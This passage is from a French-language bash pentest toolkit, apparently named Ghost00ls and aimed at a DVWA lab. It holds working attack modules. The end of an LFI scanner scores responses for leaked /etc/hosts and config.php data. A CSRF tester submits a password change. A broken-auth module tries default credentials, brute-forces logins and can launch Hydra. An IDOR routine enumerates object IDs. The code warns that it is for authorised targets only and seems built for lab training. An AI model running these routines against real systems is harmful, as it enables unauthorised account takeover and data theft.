            elif grep -q "127.0.0.1" "$OUTFILE"; then
                PROOF="/etc/hosts"; SCORE=$((SCORE+60))
                cp "$OUTFILE" "$PROOFDIR/${SAFE}_hosts.html"
            elif grep -q "DB_PASSWORD" "$OUTFILE"; then
                PROOF="config.php"; SCORE=$((SCORE+80))
                cp "$OUTFILE" "$PROOFDIR/${SAFE}_config.html"
            elif grep -q "<?php" "$OUTFILE"; then
                PROOF="php-source"; SCORE=$((SCORE+50))
                cp "$OUTFILE" "$PROOFDIR/${SAFE}_php.html"
            fi
        fi

        if [ "$SCORE" -ge 100 ]; then
            [ "${STREAMING^^}" = "Y" ] && echo "‚úÖ [CRITICAL] $STATUS | ${SIZE}B | ${TIME_REQ}s | $PAYLOAD -> $PROOF"
        elif [ "$SCORE" -ge 50 ]; then
            [ "${STREAMING^^}" = "Y" ] && echo "üü° [POTENTIAL] $STATUS | ${SIZE}B | ${TIME_REQ}s | $PAYLOAD"
        else
            [ "${STREAMING^^}" = "Y" ] && echo "‚ùå [MISS] $STATUS | ${SIZE}B | ${TIME_REQ}s | $PAYLOAD"
        fi

        echo "$(date +%F_%T),$PAYLOAD,$STATUS,$SIZE,$TIME_REQ,$SCORE,$PROOF,$OUTFILE" >> "$CSV"
    done < "$WORDLIST"

    echo
    echo "‚ñ∂ G√©n√©ration rapport HTML..."
    {
        echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Ghost00ls LFI Report</title>"
        echo "<style>body{font-family:monospace;background:#111;color:#ddd}table{border-collapse:collapse;width:100%}th,td{border:1px solid #333;padding:4px}th{background:#222}a{color:#9cf}</style></head><body>"
        echo "<h2>Ghost00ls - LFI Report</h2><p>Cible : $TARGET_URL</p><p>Date : $(date)</p>"
        echo "<table><tr><th>Time</th><th>Payload</th><th>Status</th><th>Size</th><th>Time</th><th>Score</th><th>Proof</th><th>File</th></tr>"
        tail -n +2 "$CSV" | awk -F',' '{printf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td><a href=\"file://%s\">open</a></td></tr>\n",$1,$2,$3,$4,$5,$6,$7,$8)}'
        echo "</table><p>Logs : $LOGDIR</p><p>Preuves : $PROOFDIR</p></body></html>"
    } > "$REPORT_HTML"

    echo
    echo "üìä R√©sum√© LFI :"
    echo "‚Ä¢ Dossier : $LOGDIR"
    echo "‚Ä¢ R√©sum√© CSV : $CSV"
    echo "‚Ä¢ Rapport HTML : $REPORT_HTML"
    echo "‚Ä¢ Dossier preuves : $PROOFDIR"
    echo "‚úÖ Scan termin√©."
    read -p "üëâ Entr√©e pour revenir..."
}


###################################################################################################

exploit_csrf() {
    clear
    banner "CSRF"
    echo "=================================================="
    echo "üß™ [Cross-Site Request Forgery - exploit_csrf]"
    echo "üìñ Objectif : d√©tecter la pr√©sence ou l‚Äôabsence de protections CSRF sur un formulaire sensible"
    echo "‚ö†Ô∏è  √Ä utiliser uniquement sur des cibles autoris√©es"
    echo "=================================================="

    local TARGET_IP TARGET_PORT TARGET_PATH TARGET_URL METHOD COOKIE STREAMING LOGDIR WORKDIR CSV REPORT_HTML
    local PAYLOAD_FILE TOKEN_FIELD

    read -p "üåê H√¥te/IP cible (default: 192.168.20.101): " TARGET_IP; TARGET_IP=${TARGET_IP:-192.168.20.101}
    read -p "üîå Port (default: 8081): " TARGET_PORT; TARGET_PORT=${TARGET_PORT:-8081}
    read -p "üìÅ Path du formulaire cible (ex: /vulnerabilities/csrf/): " TARGET_PATH; TARGET_PATH=${TARGET_PATH:-/vulnerabilities/csrf/}
    read -p "üîß M√©thode HTTP (GET/POST) [default: POST]: " METHOD; METHOD=${METHOD:-POST}
    read -p "üç™ Cookie PHPSESSID (laisser vide pour anonyme): " COOKIE
    read -p "‚ñ∂ Mode streaming (afficher r√©sultats en direct) ? [Y/n]: " STREAMING; STREAMING=${STREAMING:-Y}

    TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}${TARGET_PATH}"
    WORKDIR="$(mktemp -d)"
    LOGDIR="$HOME/ghost00ls/logs/dvwa_exploits/csrf/$(date +%F_%H-%M-%S)"
    mkdir -p "$LOGDIR"
    CSV="$LOGDIR/csrf_summary_$(date +%F_%H-%M-%S).csv"
    REPORT_HTML="$LOGDIR/csrf_report.html"

    echo
    echo "üåê Cible : $TARGET_URL"
    echo "üìÅ Logs : $LOGDIR"
    echo

    # === √âtape 1 : r√©cup√©ration du formulaire ===
    local FORM_FILE="$WORKDIR/form.html"
    if [ -n "$COOKIE" ]; then
        curl -s -L -k -A "Ghost00ls-CSRF" -H "Cookie: $COOKIE" "$TARGET_URL" -o "$FORM_FILE"
    else
        curl -s -L -k -A "Ghost00ls-CSRF" "$TARGET_URL" -o "$FORM_FILE"
    fi

    echo "‚ñ∂ Analyse du formulaire pour d√©tecter un token CSRF..."
    TOKEN_FIELD=$(grep -Eo 'name=["'\'']csrf[^"'\''> ]*' "$FORM_FILE" | head -1 | cut -d'=' -f2 | tr -d '"' | tr -d "'")
    local HAS_TOKEN="N"
    if [ -n "$TOKEN_FIELD" ]; then
        echo "‚úÖ Champ token d√©tect√© : $TOKEN_FIELD"
        HAS_TOKEN="Y"
    else
        echo "‚ö†Ô∏è  Aucun champ CSRF token d√©tect√©"
    fi

    echo "timestamp,method,status,size,time,token_present,csrf_protected,result" > "$CSV"

    # === √âtape 2 : test avec et sans token ===
    echo
    echo "‚ñ∂ Simulation de requ√™te sans CSRF token..."

    local OUT_WITH OUT_WITHOUT STATUS_WITH STATUS_WITHOUT SIZE_WITH SIZE_WITHOUT TIME_WITH TIME_WITHOUT RESULT=""

    # R√©cup√©ration token s‚Äôil existe
    local TOKEN_VALUE=""
    if [ "$HAS_TOKEN" = "Y" ]; then
        TOKEN_VALUE=$(grep -Eo 'value=["'\''][^"'\'' >]+' "$FORM_FILE" | grep -m1 -Eo '[^"'\'' >]+$')
        echo "üîë Token d√©tect√© : $TOKEN_VALUE"
    fi

    local POSTDATA="password_new=ghost00ls&password_conf=ghost00ls"
    local URL_ENCODED=$(printf '%s' "$POSTDATA" | jq -sRr @uri 2>/dev/null || echo "$POSTDATA")

    if [ "$HAS_TOKEN" = "Y" ]; then
        # Test normal avec token
        OUT_WITH=$(curl -s -L -k -A "Ghost00ls-CSRF" -H "Cookie: $COOKIE" \
            -w "%{http_code}|%{size_download}|%{time_total}" \
            -d "${POSTDATA}&${TOKEN_FIELD}=${TOKEN_VALUE}" \
            -o "$WORKDIR/with_token.html" "$TARGET_URL")
        STATUS_WITH=$(echo "$OUT_WITH" | cut -d'|' -f1)
        SIZE_WITH=$(echo "$OUT_WITH" | cut -d'|' -f2)
        TIME_WITH=$(echo "$OUT_WITH" | cut -d'|' -f3)
    else
        STATUS_WITH="000"; SIZE_WITH="0"; TIME_WITH="0"
    fi

    # Test sans token
    OUT_WITHOUT=$(curl -s -L -k -A "Ghost00ls-CSRF" -H "Cookie: $COOKIE" \
        -w "%{http_code}|%{size_download}|%{time_total}" \
        -d "$POSTDATA" -o "$WORKDIR/without_token.html" "$TARGET_URL")
    STATUS_WITHOUT=$(echo "$OUT_WITHOUT" | cut -d'|' -f1)
    SIZE_WITHOUT=$(echo "$OUT_WITHOUT" | cut -d'|' -f2)
    TIME_WITHOUT=$(echo "$OUT_WITHOUT" | cut -d'|' -f3)

    # === √âtape 3 : analyse comparative ===
    echo
    echo "‚ñ∂ Analyse comparative des r√©ponses..."
    if [ "$HAS_TOKEN" = "Y" ]; then
        if [ "$STATUS_WITHOUT" = "$STATUS_WITH" ] && [ "$SIZE_WITHOUT" = "$SIZE_WITH" ]; then
            RESULT="‚ùå Vuln√©rable (action possible sans token)"
        else
            RESULT="‚úÖ Prot√©g√© (token requis)"
        fi
    else
        RESULT="‚ö†Ô∏è Pas de token d√©tect√© (probablement vuln√©rable)"
    fi

    echo "$(date +%F_%T),$METHOD,$STATUS_WITHOUT,$SIZE_WITHOUT,$TIME_WITHOUT,$HAS_TOKEN,$RESULT,$TARGET_URL" >> "$CSV"

    if [ "${STREAMING^^}" = "Y" ]; then
        echo
        echo "üìä R√©sultat du test CSRF :"
        echo "‚Ä¢ Requ√™te sans token : HTTP $STATUS_WITHOUT (${SIZE_WITHOUT} B)"
        echo "‚Ä¢ Requ√™te avec token :  HTTP ${STATUS_WITH:-000} (${SIZE_WITH:-0} B)"
        echo "‚û°Ô∏è  $RESULT"
    fi

    # === Rapport HTML ===
    echo
    echo "‚ñ∂ G√©n√©ration rapport HTML..."
    {
        echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Ghost00ls CSRF Report</title>"
        echo "<style>body{font-family:monospace;background:#111;color:#ddd}table{border-collapse:collapse;width:100%}th,td{border:1px solid #333;padding:4px}th{background:#222}</style></head><body>"
        echo "<h2>Ghost00ls - CSRF Test Report</h2><p>Cible : $TARGET_URL</p><p>Date : $(date)</p>"
        echo "<table><tr><th>Time</th><th>Method</th><th>Status</th><th>Size</th><th>Token</th><th>Protected</th><th>Result</th></tr>"
        tail -n +2 "$CSV" | awk -F',' '{printf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>\n",$1,$2,$3,$4,$6,$7,$8)}'
        echo "</table><p>Logs : $LOGDIR</p></body></html>"
    } > "$REPORT_HTML"

    echo
    echo "üìä R√©sum√© CSRF :"
    echo "‚Ä¢ Dossier : $LOGDIR"
    echo "‚Ä¢ R√©sum√© CSV : $CSV"
    echo "‚Ä¢ Rapport HTML : $REPORT_HTML"
    echo "‚úÖ Scan termin√©."
    read -p "üëâ Entr√©e pour revenir..."
}


###################################################################################################

exploit_auth() {
    clear
    banner "BROKEN AUTH"
    echo "=================================================="
    echo "üß™ [Broken Auth - exploit_auth]"
    echo "üìñ Objectif : tester failles d'authentification (default creds, bruteforce, CSRF, cookies)"
    echo "‚ö†Ô∏è  √Ä utiliser uniquement sur des cibles autoris√©es"
    echo "=================================================="

    # --- params / prompts ---
    local TARGET_IP TARGET_PORT LOGIN_PATH LOGIN_URL METHOD COOKIE HEADER CREDS_WL BF_WL THREADS STREAMING RATE_LIMIT HYDRA_USE WORKDIR LOGDIR CSV HTML REPORT_DIR
    read -p "üåê H√¥te/IP cible (default: 192.168.20.101): " TARGET_IP
    TARGET_IP=${TARGET_IP:-192.168.20.101}
    read -p "üîå Port (default: 8081): " TARGET_PORT
    TARGET_PORT=${TARGET_PORT:-8081}
    read -p "üìÅ Path du formulaire de login (default: /login.php): " LOGIN_PATH
    LOGIN_PATH=${LOGIN_PATH:-/login.php}
    read -p "üîß M√©thode du formulaire (POST/GET) [default: POST]: " METHOD
    METHOD=${METHOD:-POST}
    read -p "üç™ Cookie header (ex: 'PHPSESSID=xxx' - laisser vide pour none): " COOKIE
    read -p "üìÇ Wordlist default creds (default: ~/ghost00ls/wordlists/default_creds.txt): " CREDS_WL
    CREDS_WL=${CREDS_WL:-$HOME/ghost00ls/wordlists/default_creds.txt}
    read -p "üìÇ Wordlist bruteforce (default: ~/ghost00ls/wordlists/bf_auth.txt): " BF_WL
    BF_WL=${BF_WL:-$HOME/ghost00ls/wordlists/bf_auth.txt}
    read -p "‚öôÔ∏è Threads hydra/ffuf (si utilis√©) (default: 4): " THREADS
    THREADS=${THREADS:-4}
    read -p "‚ñ∂ Mode streaming (afficher hits en direct) ? [Y/n]: " STREAMING
    STREAMING=${STREAMING:-Y}
    read -p "‚ñ∂ Lancer bruteforce safe (rate-limited)? [y/N]: " RATE_LIMIT
    RATE_LIMIT=${RATE_LIMIT:-N}
    read -p "‚ñ∂ Utiliser Hydra si disponible ? [y/N]: " HYDRA_USE
    HYDRA_USE=${HYDRA_USE:-N}
    read -p "‚è± Timeout par requ√™te (s) (default:10): " TIMEOUT
    TIMEOUT=${TIMEOUT:-10}

    WORKDIR=$(mktemp -d /tmp/ghost_auth_XXXX)
    LOGDIR="$HOME/ghost00ls/logs/dvwa_exploits/auth/$(date +%F_%H-%M-%S)"
    mkdir -p "$LOGDIR"
    CSV="$LOGDIR/auth_summary_$(date +%F_%H-%M-%S).csv"
    HTML="$LOGDIR/auth_report_$(date +%F_%H-%M-%S).html"
    PROOF_DIR="$LOGDIR/proof"
    mkdir -p "$PROOF_DIR"

    LOGIN_URL="http://${TARGET_IP}:${TARGET_PORT}${LOGIN_PATH}"
    echo
    echo "üåê Cible : $LOGIN_URL"
    echo "üìÅ Logs : $LOGDIR"
    echo

    # --- ensure default creds & bf wordlists exist ---
    if [ ! -f "$CREDS_WL" ]; then
        mkdir -p "$(dirname "$CREDS_WL")"
        cat > "$CREDS_WL" <<'W1'
admin:admin
admin:password
root:root
guest:guest
user:user
test:test
admin:123456
W1
        echo "‚öôÔ∏è Cr√©ation wordlist default creds -> $CREDS_WL"
    fi
    if [ ! -f "$BF_WL" ]; then
        mkdir -p "$(dirname "$BF_WL")"
        cat > "$BF_WL" <<'W2'
admin:admin
admin:password
root:root
test:1234
user:password
W2
        echo "‚öôÔ∏è Cr√©ation mini wordlist bruteforce -> $BF_WL"
    fi

    # --- fetch login page to detect fields & CSRF token (simple heuristics) ---
    echo "‚ñ∂ R√©cup√©ration du formulaire..."
    local LOGIN_PAGE="$WORKDIR/login_page.html"
    if [ -n "$COOKIE" ]; then
        curl -s -k -L -H "Cookie: $COOKIE" -o "$LOGIN_PAGE" --max-time "$TIMEOUT" "$LOGIN_URL"
    else
        curl -s -k -L -o "$LOGIN_PAGE" --max-time "$TIMEOUT" "$LOGIN_URL"
    fi
    local HTTP_STATUS
    HTTP_STATUS=$(curl -s -k -I -o /dev/null -w "%{http_code}" --max-time "$TIMEOUT" "$LOGIN_URL" || echo "000")
    echo "Status: $HTTP_STATUS"

    # simple input name detection (common names)
    local USER_FIELD PASS_FIELD CSRF_FIELD CSRF_VALUE
    USER_FIELD=$(grep -Poi '<input[^>]+name=["'\'']?\K[a-zA-Z0-9_-]+' "$LOGIN_PAGE" | grep -Ei 'user|username|login|email' | head -n1 || true)
    PASS_FIELD=$(grep -Poi '<input[^>]+name=["'\'']?\K[a-zA-Z0-9_-]+' "$LOGIN_PAGE" | grep -Ei 'pass|password' | head -n1 || true)
    CSRF_FIELD=$(grep -Poi '<input[^>]+type=["'\'']?hidden["'\''][^>]+name=["'\'']?\K[a-zA-Z0-9_-]+' "$LOGIN_PAGE" | head -n1 || true)
    if [ -n "$CSRF_FIELD" ]; then
        # extract value
        CSRF_VALUE=$(grep -Poi "<input[^>]*name=[\"']?$CSRF_FIELD[\"']?[^>]*>" "$LOGIN_PAGE" | sed -n '1p' | grep -Poi 'value=["'\'']\K[^"'\'' ]+')
    fi

    # fallback defaults
    USER_FIELD=${USER_FIELD:-username}
    PASS_FIELD=${PASS_FIELD:-password}

    echo "üß© Champs d√©tect√©s : $USER_FIELD / $PASS_FIELD"
    if [ -n "$CSRF_FIELD" ]; then
        echo "üîë CSRF d√©tect√© : $CSRF_FIELD=${CSRF_VALUE:-(no-value)}"
    else
        echo "üîë Aucun token CSRF d√©tect√©"
    fi

    # --- baseline: try a benign request to compare ---
    echo
    echo "‚ñ∂ Mesure baseline (GET login page size/time)..."
    local BASE_SIZE BASE_TIME
    BASE_SIZE=$(wc -c < "$LOGIN_PAGE" 2>/dev/null || echo 0)
    BASE_TIME=$(curl -s -k -o /dev/null -w "%{time_total}" --max-time "$TIMEOUT" "$LOGIN_URL" 2>/dev/null || echo 0)
    echo "Baseline -> size:$BASE_SIZE time:$BASE_TIME"

    # --- prepare CSV ---
    echo "time,username,password,status,size,time,notes,success" > "$CSV"

    # --- test default creds (safe list) ---
    echo
    echo "‚ñ∂ Test des identifiants par d√©faut..."
    local FOUND=0
    while IFS=: read -r u p; do
        [ -z "$u" ] && continue
        # build post data (include CSRF if present)
        local DATA
        if [ -n "$CSRF_FIELD" ]; then
            DATA="${USER_FIELD}=${u}&${PASS_FIELD}=${p}&${CSRF_FIELD}=${CSRF_VALUE}"
        else
            DATA="${USER_FIELD}=${u}&${PASS_FIELD}=${p}"
        fi

        local OUT="$WORKDIR/out_${u}_${p}.html"
        if [ "${METHOD^^}" = "POST" ]; then
            if [ -n "$COOKIE" ]; then
                curl -s -k -L -b "$COOKIE" -d "$DATA" -o "$OUT" -w "%{http_code} %{size_download} %{time_total}" --max-time "$TIMEOUT" "$LOGIN_URL" > "$WORKDIR/meta.txt" 2>/dev/null
            else
                curl -s -k -L -d "$DATA" -o "$OUT" -w "%{http_code} %{size_download} %{time_total}" --max-time "$TIMEOUT" "$LOGIN_URL" > "$WORKDIR/meta.txt" 2>/dev/null
            fi
        else
            # GET with querystring
            if [ -n "$COOKIE" ]; then
                curl -s -k -L -b "$COOKIE" -o "$OUT" -w "%{http_code} %{size_download} %{time_total}" --max-time "$TIMEOUT" "${LOGIN_URL}?${DATA}" > "$WORKDIR/meta.txt" 2>/dev/null
            else
                curl -s -k -L -o "$OUT" -w "%{http_code} %{size_download} %{time_total}" --max-time "$TIMEOUT" "${LOGIN_URL}?${DATA}" > "$WORKDIR/meta.txt" 2>/dev/null
            fi
        fi

        local META
        META=$(cat "$WORKDIR/meta.txt" 2>/dev/null || echo "000 0 0")
        local STATUS=$(echo "$META" | awk '{print $1}')
        local SIZE=$(echo "$META" | awk '{print $2}')
        local TIME_REQ=$(echo "$META" | awk '{print $3}')
        local NOTE="default-check"

        # heuristic success detection:
        #  - redirect to another page (status 302/301)
        #  - size different from baseline
        #  - presence of "logout" or username in response (simple)
        local SUCCESS=0
        if [[ "$STATUS" =~ ^3 ]]; then
            SUCCESS=1; NOTE="${NOTE};redirect"
        fi
        if [ "$SIZE" -ne "$BASE_SIZE" ]; then
            NOTE="${NOTE};size-diff"
        fi
        if grep -qiE 'logout|log out|deconnexion|disconnect|welcome|dashboard' "$OUT" 2>/dev/null; then
            SUCCESS=1; NOTE="${NOTE};login-text"
        fi
        if grep -qi "$u" "$OUT" 2>/dev/null; then
            SUCCESS=1; NOTE="${NOTE};username-echo"
        fi

        printf "%s,%s,%s,%s,%s,%s,%s,%s\n" "$(date +%F_%T)" "$u" "$p" "$STATUS" "$SIZE" "$TIME_REQ" "$NOTE" "$SUCCESS" >> "$CSV"

        if [ "$SUCCESS" -eq 1 ]; then
            FOUND=1
            echo "‚úÖ Valid creds found: $u:$p (status:$STATUS note:$NOTE)"
            cp "$OUT" "$PROOF_DIR/proof_${u}_${p}.html"
            break
        else
            if [[ "${STREAMING^^}" = "Y" ]]; then
                echo "‚ùå $u:$p ($STATUS | ${SIZE}B | ${TIME_REQ}s)"
            fi
        fi
    done < "$CREDS_WL"

    # --- optional safe bruteforce (rate-limited) ---
    if [[ "${RATE_LIMIT,,}" =~ ^y ]] && [ "$FOUND" -eq 0 ]; then
        echo
        echo "‚ñ∂ Bruteforce safe (rate-limited) using $BF_WL ..."
        local SLEEP_SEC=1
        while IFS=: read -r u p; do
            [ -z "$u" ] && continue
            local OUT="$WORKDIR/out_bf_${u}_${p}.html"
            if [ "${METHOD^^}" = "POST" ]; then
                if [ -n "$CSRF_FIELD" ]; then
                    DATA="${USER_FIELD}=${u}&${PASS_FIELD}=${p}&${CSRF_FIELD}=${CSRF_VALUE}"
                else
                    DATA="${USER_FIELD}=${u}&${PASS_FIELD}=${p}"
                fi
                curl -s -k -L -d "$DATA" -o "$OUT" -w "%{http_code} %{size_download} %{time_total}" --max-time "$TIMEOUT" "$LOGIN_URL" > "$WORKDIR/meta_bf.txt" 2>/dev/null
            else
                curl -s -k -L -o "$OUT" -w "%{http_code} %{size_download} %{time_total}" --max-time "$TIMEOUT" "${LOGIN_URL}?${DATA}" > "$WORKDIR/meta_bf.txt" 2>/dev/null
            fi
            META=$(cat "$WORKDIR/meta_bf.txt" 2>/dev/null || echo "000 0 0")
            STATUS=$(echo "$META" | awk '{print $1}')
            SIZE=$(echo "$META" | awk '{print $2}')
            TIME_REQ=$(echo "$META" | awk '{print $3}')
            NOTE="bruteforce"
            SUCCESS=0
            if [[ "$STATUS" =~ ^3 ]]; then SUCCESS=1; NOTE="${NOTE};redirect"; fi
            if grep -qi 'logout|welcome|dashboard|deconnexion|disconnect' "$OUT" 2>/dev/null; then SUCCESS=1; NOTE="${NOTE};login-text"; fi
            if [ "$SUCCESS" -eq 1 ]; then
                FOUND=1
                echo "‚úÖ Bruteforce success: $u:$p"
                cp "$OUT" "$PROOF_DIR/proof_bf_${u}_${p}.html"
                printf "%s,%s,%s,%s,%s,%s,%s,%s\n" "$(date +%F_%T)" "$u" "$p" "$STATUS" "$SIZE" "$TIME_REQ" "$NOTE" "$SUCCESS" >> "$CSV"
                break
            else
                printf "%s,%s,%s,%s,%s,%s,%s,%s\n" "$(date +%F_%T)" "$u" "$p" "$STATUS" "$SIZE" "$TIME_REQ" "$NOTE" "$SUCCESS" >> "$CSV"
                if [[ "${STREAMING^^}" = "Y" ]]; then
                    echo "‚ùå $u:$p ($STATUS | ${SIZE}B | ${TIME_REQ}s)"
                fi
            fi
            sleep "$SLEEP_SEC"
        done < "$BF_WL"
    fi

    # --- optional Hydra integration if requested and available ---
    if [[ "${HYDRA_USE,,}" =~ ^y ]] && command -v hydra >/dev/null 2>&1 && [ "$FOUND" -eq 0 ]; then
        echo
        echo "‚ñ∂ Hydra disponible et demand√© ‚Äî lancement (par d√©faut POST form) ..."
        # WARNING: hydra requires exact form fields/params. Keep simple example.
        local HYDRA_OUT="$LOGDIR/hydra_results.txt"
        if [ "${METHOD^^}" = "POST" ]; then
            hydra -s "$TARGET_PORT" -f -V -l admin -P "$BF_WL" "$TARGET_IP" http-post-form "$LOGIN_PATH:${USER_FIELD}^USER^&${PASS_FIELD}^PASS^:F=incorrect" > "$HYDRA_OUT" 2>&1 || true
            echo "‚ñ∂ Hydra output saved: $HYDRA_OUT"
            # parse hydra_out quickly
            if grep -qi "login:" "$HYDRA_OUT" 2>/dev/null; then
                echo "‚úÖ Hydra found creds ‚Äî check $HYDRA_OUT"
            fi
        else
            echo "‚ö†Ô∏è Hydra usage GET not implemented in quick template ‚Äî skip."
        fi
    fi

    # --- generate HTML report ---
    echo
    echo "‚ñ∂ G√©n√©ration rapport HTML..."
    {
        echo "<!doctype html><html><head><meta charset='utf-8'><title>Ghost00ls Auth Report</title>"
        echo "<style>body{font-family:monospace;background:#111;color:#ddd;}table{width:100%;border-collapse:collapse}th,td{padding:6px;border:1px solid #333}th{background:#222}</style>"
        echo "</head><body>"
        echo "<h2>Ghost00ls - Broken Auth Report</h2>"
        echo "<p>Target: $LOGIN_URL</p><p>Date: $(date)</p>"
        echo "<table><tr><th>Time</th><th>User</th><th>Pass</th><th>Status</th><th>Size</th><th>Time</th><th>Notes</th><th>Success</th></tr>"
        tail -n +2 "$CSV" | awk -F',' '{ print "<tr><td>"$1"</td><td>"$2"</td><td>"$3"</td><td>"$4"</td><td>"$5"</td><td>"$6"</td><td>"$7"</td><td>"$8"</td></tr>" }'
        echo "</table>"
        if ls "$PROOF_DIR"/*.html >/dev/null 2>&1; then
            echo "<h3>Proofs</h3><ul>"
            for f in "$PROOF_DIR"/*.html; do
                fn=$(basename "$f")
                echo "<li><a href=\"$f\">$fn</a></li>"
            done
            echo "</ul>"
        fi
        echo "</body></html>"
    } > "$HTML"

    echo
    echo "üìä R√©sum√© Broken Auth :"
    echo "‚Ä¢ Logs : $LOGDIR"
    echo "‚Ä¢ CSV : $CSV"
    echo "‚Ä¢ Rapport : $HTML"
    echo "‚úÖ Scan termin√©."
    read -p "üëâ Entr√©e pour revenir..."
}



###################################################################################################


exploit_idor() {
    clear
    banner "IDOR"
    echo "=================================================="
    echo "üß™ [Insecure Direct Object Reference - exploit_idor v3.0]"
    echo "üìñ Objectif : d√©tection automatique d‚ÄôIDOR (acc√®s non autoris√© √† des ressources)"
    echo "‚ö†Ô∏è  √Ä utiliser uniquement sur des cibles autoris√©es"
    echo "=================================================="

    # === Entr√©es utilisateur ===
    local TARGET_IP TARGET_PORT BASE_PATH COOKIE STREAMING TIMEOUT START_ID END_ID
    read -p "üåê H√¥te/IP cible (default: 192.168.20.101): " TARGET_IP
    TARGET_IP=${TARGET_IP:-192.168.20.101}
    read -p "üîå Port (default: 8081): " TARGET_PORT
    TARGET_PORT=${TARGET_PORT:-8081}
    read -p "üìÅ Path de base (default: /vulnerabilities/): " BASE_PATH
    BASE_PATH=${BASE_PATH:-/vulnerabilities/}
    read -p "üç™ Cookie (ex: PHPSESSID=xxx - vide = anonyme): " COOKIE
    read -p "üî¢ ID de d√©part (default: 1): " START_ID
    START_ID=${START_ID:-1}
    read -p "üî¢ ID de fin (default: 10): " END_ID
    END_ID=${END_ID:-10}
    read -p "‚ñ∂ Mode streaming (afficher r√©sultats live) ? [Y/n]: " STREAMING
    STREAMING=${STREAMING:-Y}
    read -p "‚è± Timeout par requ√™te (default: 10): " TIMEOUT
    TIMEOUT=${TIMEOUT:-10}

    local BASE_URL="http://${TARGET_IP}:${TARGET_PORT}${BASE_PATH}"
    local WORKDIR
    WORKDIR=$(mktemp -d -t ghost_idor_auto_XXXX)
    local LOGDIR="$HOME/ghost00ls/logs/dvwa_exploits/idor/$(date +%F_%H-%M-%S)"
    mkdir -p "$LOGDIR"
    local CSV="$LOGDIR/idor_summary.csv"
    local HTML="$LOGDIR/idor_report.html"
    echo "url,param,id,code,size,time,sha,score,notes" > "$CSV"

    echo
    echo "üåê Cible : $BASE_URL"
    echo "üìÅ Logs : $LOGDIR"
    echo "üìÇ Workdir : $WORKDIR"
    echo

    # === √âtape 1 : d√©couverte automatique de param√®tres ===
    echo "‚ñ∂ D√©couverte automatique des param√®tres..."
    local HTML_PAGE="$WORKDIR/base.html"
    curl -s -k -L --max-time "$TIMEOUT" -H "User-Agent: Ghost00ls-IDOR" ${COOKIE:+-H "Cookie: $COOKIE"} "$BASE_URL" -o "$HTML_PAGE"

    local PARAMS=()
    PARAMS+=($(grep -oE 'name="([a-zA-Z0-9_]+)"' "$HTML_PAGE" | cut -d'"' -f2))
    PARAMS+=($(grep -oE '[?&]([a-zA-Z0-9_]+)=' "$HTML_PAGE" | tr -d '?&=' | sort -u))
    PARAMS+=("id" "user" "uid" "profile" "doc" "file" "item" "post")

    # D√©duplication
    PARAMS=($(echo "${PARAMS[@]}" | tr ' ' '\n' | sort -u))
    echo "üîç Param√®tres potentiels : ${PARAMS[*]}"

    # === √âtape 2 : test des chemins potentiels ===
    local PATHS=( "$BASE_PATH" "${BASE_PATH}idor/" "${BASE_PATH}profile/" "${BASE_PATH}view/" "/" )
    echo "üîç Chemins test√©s : ${PATHS[*]}"
    echo

    # === Fonction utilitaire pour requ√™tes ===
    _req() {
        local url="$1" outfile="$2"
        curl -s -k -L --max-time "$TIMEOUT" -A "Ghost00ls-IDOR" ${COOKIE:+-H "Cookie: $COOKIE"} -o "$outfile" -w "%{http_code} %{size_download} %{time_total}" "$url" 2>/dev/null
    }

    # === √âtape 3 : boucle principale ===
    for path in "${PATHS[@]}"; do
        for param in "${PARAMS[@]}"; do
            for ((id=START_ID; id<=END_ID; id++)); do
                local sep="?"
                [[ "$path" == *"?"* ]] && sep="&"
                local URL="http://${TARGET_IP}:${TARGET_PORT}${path}${sep}${param}=${id}"
                local OUT="$WORKDIR/out_${param}_${id}.html"

                read -r code size time < <(_req "$URL" "$OUT")
                local sha=""; [ -f "$OUT" ] && sha=$(sha1sum "$OUT" | cut -d' ' -f1)
                local score=0 notes=""

                # Analyse heuristique
                if [[ "$code" =~ ^2 ]]; then score=$((score+40)); fi
                if [[ "$size" -gt 1000 ]]; then score=$((score+20)); fi
                if grep -qiE "admin|password|email|user|profile" "$OUT" 2>/dev/null; then
                    score=$((score+50))
                    notes="${notes}keywords-found;"
                fi
                if [[ "$sha" != "" && "$id" -gt "$START_ID" ]]; then
                    prev="$WORKDIR/out_${param}_$((id-1)).html"
                    if [ -f "$prev" ]; then
                        prev_sha=$(sha1sum "$prev" | cut -d' ' -f1)
                        if [ "$prev_sha" != "$sha" ]; then
                            score=$((score+30))
                            notes="${notes}diff-from-prev;"
                        fi
                    fi
                fi

                [[ "$STREAMING" =~ ^[Yy]$ ]] && {
                    if [ "$score" -ge 80 ]; then
                        echo "‚ö†Ô∏è [HIGH] $param=$id ($code | ${size}B) ‚Üí $URL"
                    elif [ "$score" -ge 50 ]; then
                        echo "üü° [MED]  $param=$id ($code | ${size}B)"
                    else
                        echo "‚ùå [MISS] $param=$id ($code | ${size}B)"
                    fi
                }

                echo "\"$URL\",\"$param\",$id,$code,$size,$time,$sha,$score,\"$notes\"" >> "$CSV"
            done
        done
    done

    # === √âtape 4 : g√©n√©ration rapport HTML ===
    echo
    echo "‚ñ∂ G√©n√©ration du rapport HTML..."
    {
        echo "<!doctype html><html><head><meta charset='utf-8'><title>Ghost00ls IDOR Report</title>"
        echo "<style>body{font-family:monospace;background:#111;color:#eee;padding:12px}table{border-collapse:collapse;width:100%}th,td{border:1px solid #222;padding:4px}th{background:#222}</style></head><body>"
        echo "<h2>Ghost00ls - IDOR Auto Discovery Report</h2>"
        echo "<p>Cible: ${BASE_URL}</p><p>Date: $(date)</p>"
        echo "<table><tr><th>URL</th><th>Param</th><th>ID</th><th>Status</th><th>Size</th><th>Time</th><th>Score</th><th>Notes</th></tr>"
        tail -n +2 "$CSV" | while IFS=, read -r url param id code size time sha score notes; do
            color="#aaa"; [[ "$score" -ge 80 ]] && color="#f66"; [[ "$score" -ge 50 && "$score" -lt 80 ]] && color="#fc3"
            echo "<tr style='color:${color}'><td>${url}</td><td>${param}</td><td>${id}</td><td>${code}</td><td>${size}</td><td>${time}</td><td>${score}</td><td>${notes}</td></tr>"
        done
        echo "</table><p>Logs : ${LOGDIR}</p></body></html>"
    } > "$HTML"

    echo
    echo "üìä R√©sum√© IDOR :"
